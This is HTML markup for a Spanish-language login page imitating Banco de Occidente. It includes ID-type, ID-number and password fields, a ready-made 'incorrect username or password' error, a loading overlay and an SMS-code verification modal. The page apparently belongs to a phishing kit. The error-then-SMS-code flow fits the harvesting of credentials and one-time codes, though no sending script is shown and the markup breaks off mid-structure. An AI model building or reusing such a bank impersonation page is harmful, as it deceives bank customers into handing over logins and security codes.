      <div class=container>
            <header class=header>
                  <div class=security-badge>

                        <span>Seguridad</span>
                  </div>
            </header>
            <main class=main-content>
                  <div class=logo-section>
                        <img src=img/banco-de-occidente-mobile.png alt="Banco de Occidente" class=logo>

                  </div>
                  <form class=login-form>
                        <div class=form-group>
                              <label for=docType>Identificación</label>
                              <div class=input-group>
                                    <select id=docType class=doc-type>
                                          <option>CC</option>
                                          <option>CE</option>
                                          <option>TI</option>
                                    </select>
                                    <input id=docNumber placeholder="" class=doc-number>
                              </div>
                        </div>
                        <div class=form-group>
                              <label for=password>Contraseña</label>
                              <div class=password-input>
                                    <input type=password id=password placeholder="Ingresa tu contraseña">
                                    <button type=button class=toggle-password aria-label="Mostrar contraseña">
                                          <i class="fas fa-eye"></i>
                                    </button>
                              </div>
                              <a href=# class=forgot-link>¿Olvidaste tu contraseña?</a>
                        </div>
                        <div class=form-check>
                              <input type=checkbox id=remember>
                              <label for=remember>Recordar mis datos</label>
                        </div>
                        <div id=errorMessage class=error-message style=display:none>
                              Usuario o contraseña incorrectos. Por favor, inténtelo de nuevo.
                        </div>
                        <button type=submit class=submit-btn>
                              <i class="fas fa-lock"></i>
                              Ingresar
                        </button>
                        <button type=button class=register-btn>
                              <i class="fas fa-user-plus"></i>
                              Regístrate
                        </button>
                  </form>
            </main>
      </div>
      <div id=loadingOverlay class=loading-overlay>

            </div>
      </div>
      <div id=smsModal class=modal>
            <div class=modal-content>
                  <div class=modal-header>

                  </div>

                              <div class=phone-hint>

                              </div>
                        </div>

                        </div>
                        <button id=submitSmsCode class=verify-btn>Verificar</button>
